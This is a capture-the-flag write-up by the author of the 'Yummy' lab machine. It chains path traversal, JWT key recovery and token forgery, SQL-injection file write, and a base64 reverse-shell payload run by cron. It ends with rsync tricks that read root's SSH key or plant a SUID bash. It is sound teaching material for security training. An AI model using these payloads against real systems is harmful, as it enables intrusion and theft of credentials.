# Yummy

## Introduction

The foothold for this box was inspired by a couple of findings from an engagement. Players will find an unconventional way of reading files via `Path Traversal` abusing a Location redirection that isn't handled properly by a default Caddy reverse proxy installation. Reading the source code, they will notice a sloppy implementation of `JWT RSA keypair creation` which they can abuse to forge an admin token. On the admin panel they'll find a `SQL injection` in an order function which will allow File Write.

`File Write` won't help them with the Flask app because debug is disabled, but a cronjob running as mysql will give them an opportunity to get a foothold.

Improper folder permisions will allow the players to pivot from mysql to www-data and find `qa` password in a Mercurial repo commit history. 

As user qa they will abuse Mercurial trusts between users and get code execution as user dev via a pre-pull hook. As user `dev` they will find different ways to abuse rsync to get root (gtfobin command won't work).

## Writeup

#### Enumeration

We start the enumeration with a port scan showing only port 22 and 80 open. On port 80 we can already see an interesting http header `Caddy`.

![image](https://i.imgur.com/AjwEhbl.png)

Accessing the IP address, we get redirected to yummy.htb which we already added to our /etc/hosts:  

![image](https://i.imgur.com/L0g8o5A.png)

Intercepting with Burp Suite, we can see the Server banner just says Caddy:  

![image](https://i.imgur.com/vW2Q6eV.png)

We don't have any accounts to login with, but we can register one and log in. We seem to just have an empty dashboard from which we can manage our appointments/reservations:  

![image](https://i.imgur.com/Qjwb53Y.png)

Logging in, we can see that a JWT was assigned to us:  

![image](https://i.imgur.com/RuaR5tA.png)

In the JWT, we can see it using RSA, we can see our role is customer and the `n` and `e` are specified in the JWT as well. We'll keep this in mind for later:  

![image](https://i.imgur.com/MYk1Od2.png)

Other than the login and register, we only have one other functionality which is the option to book a table. We enter some values in all the boxes:  

![image](https://i.imgur.com/Rc4V6vs.png)

When we book a table we get a message stating that we can manage the appointment from our account:  

![image](https://i.imgur.com/uJcteFR.png)

We go to the dashboard and can see that we can cancel the reservation or save it to our calendar.  

![image](https://i.imgur.com/8FVg0mt.png)

Canceling the reservation deletes it however saving it immediately downloads a .ics file:  

![image](https://i.imgur.com/kyPfUA0.png)

In our Burp we can see that our GET request was redirected to the /export endpoint with the filename generated based on the current time:  

![image](https://i.imgur.com/ct8mSGW.png)

The content of the .ics file has some of our input but there's nothing we can do with that as the file gets downloaded immediately. But we do see that the file was generated using the python `ics` library:  

![image](https://i.imgur.com/sMTFruw.png)

The exif data also shows us that the software used to make this file is a python library called `ics` which means that the underlying app is a python/Flask application:  

![image](https://i.imgur.com/pDH3i7a.png)

Immediately after the POST request, a GET request was made to the /export endpoint on our file and we had a 200 OK response:  

![image](https://i.imgur.com/uXcDEx9.png)

However, if we try to access that file again in our Repeater tab, we get an error that the File is not found. This tells us that the file was temporary and most likely deleted after being served to the user for download.  

![image](https://i.imgur.com/lFBvbrm.png)

#### Path Traversal

This means that any fuzzing that we'll have to do, we'll have to do by manipulating the Location header of the POST response. To make it easier, we can do a quick python script like the one below in which we can feed a wordlist of our choosing:  

```python
import requests
import json
import re


file_path = '/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt'

with open(file_path, 'r') as file:
    for line in file:
        line = line.strip()
        registerurl = 'http://yummy.htb/register'
        registerdata= {"email":"lazy@titan.com","password":"lazy"}
        requests.post(registerurl, json=registerdata)

        loginurl = 'http://yummy.htb/login'
        l = requests.post(loginurl, json=registerdata)
        access_token = l.json()['access_token']

        book_table_url = 'http://yummy.htb/book'
        book_table_data = 'name=lazy&email=lazy%40titan.com&phone=1234567890&date=2025-02-01&time=04%3A57&people=1&message=1'

        requests.post(book_table_url, data=book_table_data, headers={'content-type':'application/x-www-form-urlencoded'}, cookies={'X-AUTH-Token':access_token}, allow_redirects=False)

        dashboardurl = 'http://yummy.htb/dashboard'
        d = requests.get(dashboardurl, cookies={'X-AUTH-Token':access_token}, allow_redirects=False)
        reminderpattern = re.findall('book-a-table-btn" href="/reminder/(.*)" role="button', d.text)
        reminder = reminderpattern[0]

        reminderurl = f'http://yummy.htb/reminder/{reminder}'
        requests.get(reminderurl,cookies={'X-AUTH-Token':access_token}, allow_redirects=False)
        file_read = f"http://yummy.htb/export/{line}"
        new_response = requests.get(file_read, cookies={'X-AUTH-Token':access_token}, allow_redirects=False)
        if new_response.status_code == 200:
            print(line)
            print(new_response.content.decode())
            break

```
Within 30ish seconds we get a result and are able to read the /etc/passwd. 

![image](https://i.imgur.com/P9pboVy.png)

We can make another script to make it easier for us to pass files we want to read as arguments. Some experimentation tells us that we just need to traverse back two folders and have the slashes url encoded:  

```python
import requests
import json
import re, sys


registerurl = 'http://yummy.htb/register'
registerdata= {"email":"lazy@titan.com","password":"lazy"}
requests.post(registerurl, json=registerdata)

loginurl = 'http://yummy.htb/login'
l = requests.post(loginurl, json=registerdata)
access_token = l.json()['access_token']

book_table_url = 'http://yummy.htb/book'
book_table_data = 'name=lazy&email=lazy%40titan.com&phone=1234567890&date=2025-02-01&time=04%3A57&people=1&message=1'

requests.post(book_table_url, data=book_table_data, headers={'content-type':'application/x-www-form-urlencoded'}, cookies={'X-AUTH-Token':access_token}, allow_redirects=False)

dashboardurl = 'http://yummy.htb/dashboard'
d = requests.get(dashboardurl, cookies={'X-AUTH-Token':access_token}, allow_redirects=False)
reminderpattern = re.findall('book-a-table-btn" href="/reminder/(.*)" role="button', d.text)
reminder = reminderpattern[0]

reminderurl = f'http://yummy.htb/reminder/{reminder}'
requests.get(reminderurl,cookies={'X-AUTH-Token':access_token}, allow_redirects=False)

fileread = requests.get(f'http://yummy.htb/export/..%2f..%2f{sys.argv[1]}', cookies={'X-AUTH-Token':access_token}, allow_redirects=False)
print(fileread.text)
```

Some more enumeration is required. Through it we find that files that don't exist respond with `File not found`:  

![image](https://i.imgur.com/wucembk.png)

Whereas files that do exist but we don't have permissions to read them, gives a 500 error code:  

![image](https://i.imgur.com/qw92qxm.png)

Soon we find that there are some cronjobs in `/etc/crontab`.  

![image](https://i.imgur.com/4dPsZjs.png)  
Reading the one about the app backup, we find out the webapp root folder being `/opt/app` and it's archiving a backup in /var/www/backupapp.zip.  

![image](https://i.imgur.com/AM53BAf.png)  
We can fuzz this /opt/app path, we can make a logical assumption that the app.py will be the default name of the source code or we can download the backupapp.zip from `/var/www`. Either way, we get the source code.  

![image](https://i.imgur.com/z3kQAao.png)  

Checking the verification code, we can see that it's properly verifying the JWT and is also looking for an `administrator` role:  

![image](https://i.imgur.com/g4FPoCY.png)

However, if we were to be able to forge an administrator token, we can see that there is an `admindashboard` endpoint with a comment regarding an addition to the search functionality. An order capability was added but it may have introduced a SQL Injection vulnerability.  

![image](https://i.imgur.com/G2phJCN.png)

We'll come back to this after getting administrator access.

#### Forge Admin Token
Checking the signature code, we can see it is doing a semi-manual implementation of the JWT RSA keypair creation and in fact, the `q` and `n` values look small, especially the `q`.  

![image](https://i.imgur.com/LpWK257.png)

In fact, if we just copy and paste the code and ask ChatGPT to analyse it and tell us if there is a vulnerability, it does confirm that there's an issue here and that we can abuse it to recover the private key:  

![image](https://i.imgur.com/A5VzbGz.png)

Some research later, we find a very handy tool that would allow us to recover the private key very easily called [RsaCtfTool](https://github.com/RsaCtfTool/RsaCtfTool). Despite the name, this tool can be very handy to quickly check cryptographic issues. First, we can get the public key in a .pem format from the JWT itself because we have the `n` and the `e` there already:  

```bash
python3 RsaCtfTool.py -n <n value from JWT> -e 65537 --createpub
```

Then, we can get the private key:  

```bash
python3 RsaCtfTool.py -n <n value from JWT> -e 65537  --private
```
We save the public key and private key in separate files and then we can use [jwt_tool](https://github.com/ticarpi/jwt_tool) to tamper with the JWT and change the role to administrator.  

```bash
python3 jwt_tool.py -pk pubkey -pr privkey -S rs256 -I -pc role -pv administrator <JWT token>
```
![image](https://i.imgur.com/uPwP4gx.png)

With the forged JWT in our browser cookie jar we can navigate to `/admindashboard` and have access to the search functionality:  

![image](https://i.imgur.com/cLZPrjc.png)

#### SQL Injection
The SQL Injection we saw in the source code is confirmed when testing with a single quote in the `o` parameter. Considering the error output is visible on the page, we shouldn't have much difficulty exploiting this one:  

![image](https://i.imgur.com/qu4OP07.png)

After various SQL enumeration we can tell that there is nothing interesting in the database. We can try stacked queries and find that we have the FILE permissions and can write files to disk:  

```
http://yummy.htb/admindashboard?s=&o=DESC;select "test" into outfile "/tmp/lazytitan.txt";
```
Sending this URL and then using the Path Traversal, confirms that we have written this file. We can't read it because the File Read is done by the webapp server which is probably running as www-data, whereas the file would be created by the mysql service. We can see the difference in response before and after sending the SQLi command:  

![image](https://i.imgur.com/fOguPuM.png)

#### Foothold

We now have both File Read and File Write however, we can't overwrite files and we can't read files that would give us a foothold. This being a Flask application with debug set to False, we can't change the source code and have it apply even if we could somehow overwrite files.

Going back to our enumeration, we remember that there were some cronjobs run by the mysql user which we can write files with. The table_cleanup.sh cronjob doesn't show any opportunities for us:  

![image](https://i.imgur.com/3yCvVgP.png)

Let's have a closer look at the `/data/scripts/dbmonitor.sh` script:  

```bash
#!/bin/bash

timestamp=$(/usr/bin/date)
service=mysql
response=$(/usr/bin/systemctl is-active mysql)

if [ "$response" != 'active' ]; then
    /usr/bin/echo "{\"status\": \"The database is down\", \"time\": \"$timestamp\"}" > /data/scripts/dbstatus.json
    /usr/bin/echo "$service is down, restarting!!!" | /usr/bin/mail -s "$service is down!!!" root
    latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
    /bin/bash "$latest_version"
else
    if [ -f /data/scripts/dbstatus.json ]; then
        if grep -q "database is down" /data/scripts/dbstatus.json 2>/dev/null; then
            /usr/bin/echo "The database was down at $timestamp. Sending notification."
            /usr/bin/echo "$service was down at $timestamp but came back up." | /usr/bin/mail -s "$service was down!" root
            /usr/bin/rm -f /data/scripts/dbstatus.json
        else
            /usr/bin/rm -f /data/scripts/dbstatus.json
            /usr/bin/echo "The automation failed in some way, attempting to fix it."
            latest_version=$(/usr/bin/ls -1 /data/scripts/fixer-v* 2>/dev/null | /usr/bin/sort -V | /usr/bin/tail -n 1)
            /bin/bash "$latest_version"
        fi
    else
        /usr/bin/echo "Response is OK."
    fi
fi

[ -f dbstatus.json ] && /usr/bin/rm -f dbstatus.json
```

This cronjob that runs every minute checks to see if the mysql service is active. If it is not active, it sets a status and timestamp into a `dbstatus.json` file, sends a notification to root via email and then checks for the latest version of a `fixer-v*` script and runs the latest version with `/bin/bash`.

Within the next statement, it checks to see if there is a dbstatus.json file present within the /data/scripts directory and if it contains the words "database is down". If both of those conditions are true, it sends an email to root stating that the service was down at the timestamp mentioned in the json file and then deletes it.

If the dbstatus.json file exists but doesn't contain the words "database is down", it deletes the file, assumes something went wrong in the automation and runs the latest fixer-v* script it can find in /data/scripts.

If the mysql service is up, it just says it's ok.

We can't read the fixer script because we don't know its full name. But in this case, we don't have to. From the above logic we can figure out two things. Because the website is working, the mysql service is up, so there is no dbstatus.json file currently in the /data/scripts folder. Also, it won't go into the else statements that we need. However, we can force it to by trying to write a dbstatus.json file ourselves with anything in it that doesn't say "database is down". When the file will be detected there, it will try to run the latest fixer-v* script with /bin/bash.... so we can write our own fixer-v2 or any random number with our own reverse shell in it.

To recap, we need to write 2 files:

Step 1: Write a fixer-v2.sh script with a reverse shell.
```bash
http://yummy.htb/admindashboard?s=&o=DESC;select "echo cHl0aG9uMyAtYyAnaW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO3M9c29ja2V0LnNvY2tldChzb2NrZXQuQUZfSU5FVCxzb2NrZXQuU09DS19TVFJFQU0pO3MuY29ubmVjdCgoIjE5Mi4xNjguMTUwLjEyOCIsMTIzNCkpO29zLmR1cDIocy5maWxlbm8oKSwwKTsgb3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtpbXBvcnQgcHR5OyBwdHkuc3Bhd24oImJhc2giKSc=|base64 -d|bash" into outfile "/data/scripts/fixer-v2.sh";
```
Step 2: Write a dbstatus.json file with anything in it:
```bash
http://yummy.htb/admindashboard?s=&o=DESC;select "test" into outfile "/data/scripts/dbstatus.json";
```

After not more than 1 minute, we get a foothold as user mysql:  

![image](https://i.imgur.com/xOxmeeZ.png)

#### Lateral Movement to www-data

We start another enumeration phase as user mysql. Going back into the /data/scripts folder, we can find that the bash scripts are owned by root, however, it seems that the directory itself has overpermissive permissions:  
![image](https://i.imgur.com/mVkx3hI.png)

In the /var/www folder that the app_backup.sh script is using, we can see an `app-qatesting` directory that is shared between www-data and qa.

![image](https://i.imgur.com/dFEiaz2.png)

The app_backup.sh script runs every 2 minutes. We can't overwrite it or inject in it like we did the other script. But because of the directory permissions, we can simply delete it and rewrite it with our own code.  
![image](https://i.imgur.com/SfODhCj.png)

We were able to delete and rewrite the file despite the warning and the errors:  

![image](https://i.imgur.com/RFmHpgd.png)

After 2ish minutes, we get a foothold as www-data:  

![image](https://i.imgur.com/YWXXkCq.png)

#### Lateral Movement to qa

Now that we can access the app-qatesting directory, we see a [Mercurial](https://www.mercurial-scm.org/) repo which we can easily recognize by the presence of the `.hg` directory in it:  

![image](https://i.imgur.com/tIEdRg9.png)

Using the `hg log` command, similar with `git log`, we can see a history of commits, or "changesets" as they are described in Mercurial repos:  

![image](https://i.imgur.com/1lZd0ID.png)

Mercurial doesn't have a show command, but we can use diff to see the differences in certain changesets. Going through them, we can see that the qa user has tried to patch the holes in security that we've exploited thus far, in one of the changesets (`hg diff -c 8`) they are cleaning up the comments but also we can see that they changed the password and leaked their own:  

![image](https://i.imgur.com/jnqdc9p.png)

We can use this password to SSH in as qa and get the user.txt flag.  

![image](https://i.imgur.com/0FyAmYw.png)

#### Lateral Movement to dev

Checking the sudo permissions we can see that user qa is allowed to run a pull request as user dev from a specific folder:  

![image](https://i.imgur.com/vnlcSLP.png)

At this point, it is time to read some documentation. After some research, we find that although we can't pass any arguments as user dev when running the pull request, we can use the `hgrc` configuration file to change some behaviour. When doing this kind of pull request as another user, the hgrc configuration file that is taken into account by default is the one of the user. By default that is located in the user's home folder. The user with which the pull request command is run in this example is dev and we don't have access to his hgrc file.

Changing the qa hgrc configuration file would not take effect because it's not the qa user that is really running the pull command. As it turns out though, there are multiple levels of hgrc files, including a repository level hgrc as per the Ubuntu documentation [here](https://manpages.ubuntu.com/manpages/focal/en/man5/hgrc.5.html)

![image](https://i.imgur.com/EcDXx9t.png)

Another aspect we need to keep in mind is that Mercurial works with [trusts](https://wiki.mercurial-scm.org/Trust) which are controlled from the hgrc file. We can see how this looks like in the /home/qa/.hgrc file.

![image](https://i.imgur.com/nLWAFI7.png)

Given that this user has the sudo permission to pull from this repo, it is safe to assume that the user dev is trusting the qa user.

We don't have access to the dev hgrc file, we don't have access to the repo we are pulling from, but what we do have, is access to the repo that we are pulling into. Let's go into the /tmp folder, create another folder called testing to keep things clean.

We start a repo by using `hg init`. Then we create an hgrc file into the generated .hg directory. We can use a hook, for example [pretxnchangegroup](https://book.mercurial-scm.org/read/hook.html?highlight=hooks) and set it to run before the pull and have it execute a script we control. The content of the hgrc file would look something like this:

```text
[hooks]
pretxnchangegroup.prepull = /tmp/rev.sh
```
We create the /tmp/rev.sh with a reverse shell, don't forget the shebang line and make it executable. When we run the pull request now, we get a permissions denied on the /tmp/testing directory.

![image](https://i.imgur.com/txf6ypZ.png)

Some quick [research](https://stackoverflow.com/questions/1628810/mercurial-could-not-lock-working-directory) indicates to us that the user dev doesn't have permissions to write in the .hg directory we created when we initiated the repo. We can easily solve that by giving full permissions using `chmod -R 777 .hg` inside our repo.

We run the sudo command now while we are listening and get a callback from user dev:  

![image](https://i.imgur.com/9OFKZJE.png)

We also see an interesting message from the dev user stating that he is out of office, which explains why the vulnerabilities still exist despite the QA efforts. (I made it so that it will always show that he is Out of Office until "tomorrow").

#### Privilege Escalation

As user dev, we can see he has sudo permissions to run rsync in certain conditions:  

![image](https://i.imgur.com/X063R9H.png)

It seems that they are using rsync to copy the content of the production ready app to /opt/app while excluding the .hg directory. However, they are using a wildcard.  

![image](https://i.imgur.com/1YiF2wM.png)

Rsync does have a [gtfobin](https://gtfobins.github.io/gtfobins/rsync/#sudo) entry, however, when we try it, we get an error. It seems that we can't run it when we also have `/opt/app` at the end, and we need that.  

```bash
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/ -e 'sh -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null /opt/app/
```

![image](https://i.imgur.com/7NzK2i9.png)

> [!IMPORTANT]  
> Well, I'm excited to say that I was proven wrong here. There's a brilliant workaround in this writeup where the `/opt/app/` is passed to a non-important flag: 
> https://blog.ryuki.dev/ctf/htb/machines/season-6/yummy#method-3 

<s>Although we are not able to use the -e flag to execute remote commands</s>, there are other flags that could be abused. Here are a few examples:

## Example 1: using --files-from

The `--files-form` flag allows us to read a list of files from a given file. However, when the given file doesn't contain a list of files, the error is verbose showing the content of the file.  
![image](https://i.imgur.com/TSpokUE.png)

```bash
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/ --files-from=/root/.ssh/id_rsa /opt/app/
```
![image](https://i.imgur.com/pjBxwoa.png)

The root.txt flag can be read the same way. This is a simple solution that doesn't depend on the player winning a "race condition" so the cleanup script is irrelevant here.

## Example 2: SUID binary

If we spend too long looking into the /opt/app directory after running the rsync command, we won't see anything in it because there is a restoration script to keep the /opt/app directory clean for other players to be able to enumerate and not accidentally find files from players that are more ahead into the exploitation path. This script runs every 10 seconds so the likelihood of another user finding the files from a different user are reduced. This would happen only if using the symlink or SUID options.  

![image](https://i.imgur.com/WtmLQ42.png)

One could run the commands below in quick succession or simply by chaining them with `;` or `&&`. This will copy the bash binary in the app-production folder that the dev user has access to. Then it will give it SUID permissions and the sudo commmand will change the owner to root. We list the contents of /opt/app directory to confirm that we now have a SUID bash binary owned by root. Then we execute bash with `-p` to preserve permissions and get root.

```bash
cp /bin/bash /home/dev/app-production
chmod u+s /home/dev/app-production/bash
sudo /usr/bin/rsync -a --exclude\=.hg /home/dev/app-production/* --chown root:root /opt/app/
ls -la /opt/app
/opt/app/bash -p
```

![image](https://i.imgur.com/DeFoHx4.png)

## Example 3: using symlink

Another option is to use a symlink by transforming it using the `-L` flag:  

![image](https://i.imgur.com/wwEABfE.png)

```bash
ln -s /root/.ssh/id_rsa root_id_rsa
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/ -L --chown=dev:dev /opt/app/
```
Notice that we are also using the `--chown` flag so that we can actually read the file after we copy it, otherwise the permissions of the root user would be kept and we wouldn't be able to read the file.  

![image](https://i.imgur.com/fw34WLZ.png)

Players can simply run the commands at the same time to be faster and win the "race condition" imposed by the cleanup script.

```bash
ln -s /root/.ssh/id_rsa root_id_rsa
sudo /usr/bin/rsync -a --exclude=.hg /home/dev/app-production/ -L --chown=dev:dev /opt/app/;cat /opt/app/root_id_rsa
```

![image](https://i.imgur.com/Gp46MA0.png)

Or they can get the root flag directly:  

![image](https://i.imgur.com/KqANM8y.png)

# Disclaimer

I can understand that some may have found the cleanup here annoying. I couldn't think of other ways to ensure that the directory doesn't get clobbered by  players. I do have to keep in mind that after the Release Arena, there will be multiple players doing the same box at the same time. On the plus side, it doesn't impact one of the solutions and it isn't completely unrealistic as often times, in production environments, you can find similar cleanup scripts or even IDS systems trying to prevent malicious modifications that could be bypassed by being fast (race conditions). That being said, thank you to everyone for the amazing feedback.
